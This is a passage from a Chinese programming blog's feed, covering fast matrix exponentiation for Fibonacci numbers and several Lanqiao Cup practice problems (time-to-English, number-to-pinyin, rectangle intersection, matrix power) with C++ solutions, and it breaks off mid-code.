data-src="https://www.zhihu.com/equation?tex=+%5Cbegin%7Baligned%7D+%5Cbegin%7Bbmatrix%7DF_n%5C%5C+F_%7Bn%2B1%7D%5Cend%7Bbmatrix%7D+%26%3D+A%5Cbegin%7Bbmatrix%7DF_%7Bn-1%7D%5C%5C+F_n%5Cend%7Bbmatrix%7D%5C%5C%26%3DA%5E2%5Cbegin%7Bbmatrix%7DF_%7Bn-2%7D%5C%5C+F_%7Bn-1%7D%5Cend%7Bbmatrix%7D%5C%5C%26%3D...%5C%5C%26%3DA%5E%7Bn-1%7D%5Cbegin%7Bbmatrix%7DF_1%5C%5C+F_2%5Cend%7Bbmatrix%7D%5C%5C%26%3DA%5E%7Bn-1%7D%5Cbegin%7Bbmatrix%7D1%5C%5C+1%5Cend%7Bbmatrix%7D+%5Cend%7Baligned%7D"  alt="[公式]" eeimg="1" data-formula=" \begin{aligned} \begin{bmatrix}F_n\\ F_{n+1}\end{bmatrix} &amp;= A\begin{bmatrix}F_{n-1}\\ F_n\end{bmatrix}\\&amp;=A^2\begin{bmatrix}F_{n-2}\\ F_{n-1}\end{bmatrix}\\&amp;=...\\&amp;=A^{n-1}\begin{bmatrix}F_1\\ F_2\end{bmatrix}\\&amp;=A^{n-1}\begin{bmatrix}1\\ 1\end{bmatrix} \end{aligned}"> </p><p>这样，我们把原来较为复杂的问题转化成了<b>求某个矩阵的幂</b>的问题，这就可以应用快速幂求解了。<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOD 1000000007</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ll a1, a2, b1, b2;</span><br><span class="line">    <span class="built_in">matrix</span>(ll a1, ll a2, ll b1, ll b2) : <span class="built_in">a1</span>(a1), <span class="built_in">a2</span>(a2), <span class="built_in">b1</span>(b1), <span class="built_in">b2</span>(b2) &#123;&#125;</span><br><span class="line">    matrix <span class="keyword">operator</span>*(<span class="keyword">const</span> matrix &amp;y)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function">matrix <span class="title">ans</span><span class="params">((a1 * y.a1 + a2 * y.b1) % MOD,</span></span></span><br><span class="line"><span class="function"><span class="params">                   (a1 * y.a2 + a2 * y.b2) % MOD,</span></span></span><br><span class="line"><span class="function"><span class="params">                   (b1 * y.a1 + b2 * y.b1) % MOD,</span></span></span><br><span class="line"><span class="function"><span class="params">                   (b1 * y.a2 + b2 * y.b2) % MOD)</span></span>;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">matrix <span class="title">qpow</span><span class="params">(matrix a, ll n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">matrix <span class="title">ans</span><span class="params">(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>)</span></span>; <span class="comment">//单位矩阵</span></span><br><span class="line">    <span class="keyword">while</span> (n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n &amp; <span class="number">1</span>)</span><br><span class="line">            ans = ans * a;</span><br><span class="line">        a = a * a;</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll x;</span><br><span class="line">    <span class="function">matrix <span class="title">M</span><span class="params">(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;x);</span><br><span class="line">    matrix ans = <span class="built_in">qpow</span>(M, x - <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, (ans.a1 + ans.a2) % MOD);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这位博主的专栏总结也很棒，但需要一定的算法基础，可以存着以后看：<a href="https://zhuanlan.zhihu.com/p/105467597">算法学习笔记（目录）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;转载于：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/95902286&quot;&gt;算法学习笔记(4)：快速幂&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;RichText ztext Post-Rich</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯刷题一</title>
    <link href="https://zss192.github.io/2021/03/31/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E4%B8%80/"/>
    <id>https://zss192.github.io/2021/03/31/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E4%B8%80/</id>
    <published>2021-03-31T13:13:27.000Z</published>
    <updated>2021-04-09T09:35:40.087Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>题目来源：<a href="https://www.dotcpp.com/oj/problemset.php?page=3&amp;mark=6">蓝桥杯ACM训练系统</a><br>题目编号1468~1479</p></blockquote><h1>1.报时助手</h1><p><strong>题目描述</strong></p><p>给定当前的时间，请用英文的读法将它读出来。时间用时h和分m表示，在英文的读法中，读一个时间的方法是：如果m为0，则将时读出来，然后加上“o’clock”，如3:00读作“three  o’clock”。如果m不为0，则将时读出来，然后将分读出来，如5:30读作“five  thirty”。时和分的读法使用的是英文数字的读法，其中0~20读作：0:zero,  1:  one,  2:two,  3:three,  4:four,  5:five,  6:six,  7:seven,  8:eight,  9:nine,  10:ten,  11:eleven,  12:twelve,  13:thirteen,  14:fourteen,  15:fifteen,  16:sixteen,  17:seventeen,  18:eighteen,  19:nineteen,  20:twenty。30读作thirty，40读作forty，50读作fifty。对于大于20小于60的数字，首先读整十的数，然后再加上个位数。如31首先读30再加1的读法，读作“thirty  one”。按上面的规则21:54读作“twenty  one  fifty  four”，9:07读作“nine  seven”，0:15读作“zero  fifteen”。</p><p><strong>输入</strong></p><p>输入包含两个非负整数h和m，表示时间的时和分。非零的数字前没有前导0。h小于24，m小于60。</p><p><strong>输出</strong></p><p>输出时间时刻的英文。</p><p><strong>样例输入</strong></p><p><code>0 15</code></p><p><strong>样例输出</strong></p><p><code>zero fifteen</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string nums[]=&#123;<span class="string">&quot;zero&quot;</span>,<span class="string">&quot;one&quot;</span>,<span class="string">&quot;two&quot;</span>,<span class="string">&quot;three&quot;</span>,<span class="string">&quot;four&quot;</span>,<span class="string">&quot;five&quot;</span>,<span class="string">&quot;six&quot;</span>,<span class="string">&quot;seven&quot;</span>,<span class="string">&quot;eight&quot;</span>,<span class="string">&quot;nine&quot;</span>,<span class="string">&quot;ten&quot;</span>,<span class="string">&quot;eleven&quot;</span>,<span class="string">&quot;twelve&quot;</span>,<span class="string">&quot;thirteen&quot;</span>,<span class="string">&quot;fourteen&quot;</span>,<span class="string">&quot;fifteen&quot;</span>,<span class="string">&quot;sixteen&quot;</span>,<span class="string">&quot;seventeen&quot;</span>,<span class="string">&quot;eighteen&quot;</span>,<span class="string">&quot;nineteen&quot;</span>,<span class="string">&quot;twenty&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> h,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">duShi</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(h&lt;=<span class="number">20</span>)</span><br><span class="line">        cout&lt;&lt;nums[h]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        cout&lt;&lt;nums[<span class="number">20</span>]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;nums[h<span class="number">-20</span>]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">duFen</span><span class="params">(<span class="keyword">int</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(m==<span class="number">0</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;o&#x27;clock&quot;</span>&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(m&lt;=<span class="number">20</span>)</span><br><span class="line">        cout&lt;&lt;nums[m]&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> shi=m-(m%<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">int</span> ge=m%<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(shi==<span class="number">20</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;twenty&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(shi==<span class="number">30</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;thirty&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(shi==<span class="number">40</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;forty&quot;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(shi==<span class="number">50</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;fifty&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(ge!=<span class="number">0</span>)</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;nums[ge]&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    cin&gt;&gt;h&gt;&gt;m;</span><br><span class="line">    <span class="built_in">duShi</span>(h);</span><br><span class="line">    <span class="built_in">duFen</span>(m);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>2.数的读法</h1><p><strong>题目描述</strong></p><p>Tom教授正在给研究生讲授一门关于基因的课程，有一件事情让他颇为头疼：一条染色体上有成千上万个碱基对，它们从0开始编号，到几百万，几千万，甚至上亿。比如说，在对学生讲解第1234567009号位置上的碱基时，光看着数字是很难准确的念出来的。所以，他迫切地需要一个系统，然后当他输入12  3456  7009时，会给出相应的念法：十二亿三千四百五十六万七千零九用汉语拼音表示为shi  er  yi  san  qian  si  bai  wu  shi  liu  wan  qi  qian  ling  jiu这样他只需要照着念就可以了。你的任务是帮他设计这样一个系统：给定一个阿拉伯数字串，你帮他按照中文读写的规范转为汉语拼音字串，相邻的两个音节用一个空格符格开。注意必须严格按照规范，比如说“10010”读作“yi  wan  ling  yi  shi”而不是“yi  wan  ling  shi”，“100000”读作“shi  wan”而不是“yi  shi  wan”，“2000”读作“er  qian”而不是“liang  qian”。</p><p><strong>输入</strong></p><p>有一个数字串，数值大小不超过2,000,000,000。</p><p><strong>输出</strong></p><p>是一个由小写英文字母，逗号和空格组成的字符串，表示该数的英文读法。</p><p><strong>样例输入</strong></p><p><code>1234567009</code></p><p><strong>样例输出</strong></p><p><code>shi er yi san qian si bai wu shi liu wan qi qian ling jiu</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    string a[<span class="number">12</span>]=&#123;<span class="string">&quot;ling&quot;</span>,<span class="string">&quot;yi&quot;</span>,<span class="string">&quot;er&quot;</span>,<span class="string">&quot;san&quot;</span>,<span class="string">&quot;si&quot;</span>,<span class="string">&quot;wu&quot;</span>,<span class="string">&quot;liu&quot;</span>,<span class="string">&quot;qi&quot;</span>,<span class="string">&quot;ba&quot;</span>,<span class="string">&quot;jiu&quot;</span>,<span class="string">&quot;shi&quot;</span>&#125;;<span class="comment">//创建一个每个数字所对应的拼音的字符串</span></span><br><span class="line">    string b[<span class="number">9</span>]=&#123;<span class="string">&quot;shi&quot;</span>,<span class="string">&quot;bai&quot;</span>,<span class="string">&quot;qian&quot;</span>,<span class="string">&quot;wan&quot;</span>,<span class="string">&quot;shi&quot;</span>,<span class="string">&quot;bai&quot;</span>,<span class="string">&quot;qian&quot;</span>,<span class="string">&quot;yi&quot;</span>,<span class="string">&quot;shi&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n,x,i,j,c[<span class="number">10</span>],num;</span><br><span class="line">    <span class="keyword">while</span>(cin&gt;&gt;n)<span class="comment">//循环输入</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)<span class="comment">//判断是否输入的是0，如果是的话直接输出，不用循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;<span class="string">&quot;ling&quot;</span>&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x=<span class="number">0</span>,num=<span class="number">0</span>,i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n/<span class="number">10</span>!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            c[x++]=n%<span class="number">10</span>;</span><br><span class="line">            n=n/<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c[x]=n;<span class="comment">//把输入的n的各位数字放入到数组中</span></span><br><span class="line">        <span class="keyword">for</span>(i=x;i&gt;<span class="number">0</span>;i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(c[i]==<span class="number">0</span>)<span class="comment">//0和不是0的分开判断</span></span><br><span class="line">            &#123;</span><br><span class="line">                num++;<span class="comment">//计算0的个数</span></span><br><span class="line">                <span class="keyword">if</span>(i!=<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(c[i]==<span class="number">0</span>&amp;&amp;c[i<span class="number">-1</span>]!=<span class="number">0</span>)</span><br><span class="line">                        cout&lt;&lt;<span class="string">&quot;ling &quot;</span>;<span class="comment">//防止多输出“ling”</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(c[i]==<span class="number">1</span>&amp;&amp;i%<span class="number">4</span>==<span class="number">1</span>)<span class="comment">//为了输出类似“十万”而不是“一十万”</span></span><br><span class="line">            &#123;</span><br><span class="line">                cout&lt;&lt;<span class="string">&quot;shi&quot;</span>&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> cout&lt;&lt;a[c[i]]&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;b[i<span class="number">-1</span>]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c[i]!=<span class="number">0</span>)</span><br><span class="line">            cout&lt;&lt;a[c[i]];<span class="comment">//个位数字是0的话不用输出</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            num++;</span><br><span class="line">        <span class="keyword">if</span>(num==x&amp;&amp;num&gt;<span class="number">4</span>&amp;&amp;num%<span class="number">4</span>&gt;=<span class="number">1</span>)</span><br><span class="line">            cout&lt;&lt;b[num<span class="number">-2</span>];<span class="comment">//对应输出“200000”这种除去首位之外全是零的数字</span></span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 来源：https://blog.dotcpp.com/a/62175</span></span><br></pre></td></tr></table></figure><h1>3.矩形面积交</h1><p><strong>题目描述</strong></p><p>平面上有两个矩形，它们的边平行于直角坐标系的X轴或Y轴。对于每个矩形，我们给出它的一对相对顶点的坐标，请你编程算出两个矩形的交的面积。</p><p><strong>输入</strong></p><p>输入仅包含两行，每行描述一个矩形。 在每行中，给出矩形的一对相对顶点的坐标，每个点的坐标都用两个绝对值不超过10^7的实数表示。</p><p><strong>输出</strong></p><p>输出仅包含一个实数，为交的面积，保留到小数后两位。</p><p><strong>样例输入</strong></p><p><code>1 1 3 3  2 2 4 4</code></p><p><strong>样例输出</strong></p><p><code>1.00</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">point</span>         //定义&quot;点&quot;类，可用大小为2的数组代替</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">double</span> x;</span><br><span class="line">    <span class="keyword">double</span> y;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycheck</span><span class="params">(point a, point b)</span>              <span class="comment">//函数：判断点a是否在点b左下方</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (a.x &lt; b.x &amp;&amp; a.y &lt; b.y);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> x[<span class="number">4</span>];                <span class="comment">//记录输入的横坐标</span></span><br><span class="line">    <span class="keyword">double</span> y[<span class="number">4</span>];                <span class="comment">//记录输入的纵坐标</span></span><br><span class="line"> </span><br><span class="line">    point a1, a2, b1, b2;       <span class="comment">//定义矩阵A与B的左下和右上端点，1为左下，2为右上</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)     <span class="comment">//循环输入</span></span><br><span class="line">    &#123;</span><br><span class="line">        cin &gt;&gt; x[i] &gt;&gt; y[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//寻找两矩阵的左下右上端点</span></span><br><span class="line">    a1.x = <span class="built_in">fmin</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]), a1.y = <span class="built_in">fmin</span>(y[<span class="number">0</span>], y[<span class="number">1</span>]);</span><br><span class="line">    a2.x = <span class="built_in">fmax</span>(x[<span class="number">0</span>], x[<span class="number">1</span>]), a2.y = <span class="built_in">fmax</span>(y[<span class="number">0</span>], y[<span class="number">1</span>]);</span><br><span class="line"> </span><br><span class="line">    b1.x = <span class="built_in">fmin</span>(x[<span class="number">2</span>], x[<span class="number">3</span>]), b1.y = <span class="built_in">fmin</span>(y[<span class="number">2</span>], y[<span class="number">3</span>]);</span><br><span class="line">    b2.x = <span class="built_in">fmax</span>(x[<span class="number">2</span>], x[<span class="number">3</span>]), b2.y = <span class="built_in">fmax</span>(y[<span class="number">2</span>], y[<span class="number">3</span>]);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">double</span> ans = <span class="number">0</span>;             <span class="comment">//定义答案</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mycheck</span>(b1, a2) &amp;&amp; <span class="built_in">mycheck</span>(a1, b2))     <span class="comment">//判断是否重合</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sort</span>(x, x + <span class="number">4</span>);                         <span class="comment">//横坐标排序</span></span><br><span class="line">        <span class="built_in">sort</span>(y, y + <span class="number">4</span>);                         <span class="comment">//纵坐标排序</span></span><br><span class="line">        ans = (x[<span class="number">2</span>] - x[<span class="number">1</span>]) * (y[<span class="number">2</span>] - y[<span class="number">1</span>]);    <span class="comment">//计算答案</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, ans);                      <span class="comment">//输出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//来源：https://blog.dotcpp.com/a/77089</span></span><br></pre></td></tr></table></figure><h1>4.矩阵乘法</h1><p><strong>题目描述</strong></p><p>给定一个N阶矩阵A，输出A的M次幂（M是非负整数）例如：A  =1  23  4A的2次幂7  1015  22</p><p><strong>输入</strong></p><p>第一行是一个正整数N、M（1&lt; =N&lt; =30,  0&lt; =M&lt; =5），表示矩阵A的阶数和要求的幂数 接下来N行，每行N个绝对值不超过10的非负整数，描述矩阵A的值</p><p><strong>输出</strong></p><p>输出共N行，每行N个整数，表示A的M次幂所对应的矩阵。相邻的数之间用一个空格隔开</p><p><strong>样例输入</strong></p><p><code>2 2  1 2  3 4</code></p><p><strong>样例输出</strong></p><p><code>7 10 15 22</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> N,M;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">35</span>][<span class="number">35</span>];<span class="comment">//原矩阵</span></span><br><span class="line"><span class="keyword">int</span> res[<span class="number">35</span>][<span class="number">35</span>];<span class="comment">//每次乘积后的矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">jisuan</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span><span class="comment">//根据xy坐标计算出矩阵乘积中xy位置的结果</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum+=res[x][i]*nums[i][y];<span class="comment">//每次乘积得到的矩阵相应行乘原矩阵相应列</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin&gt;&gt;N&gt;&gt;M;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span 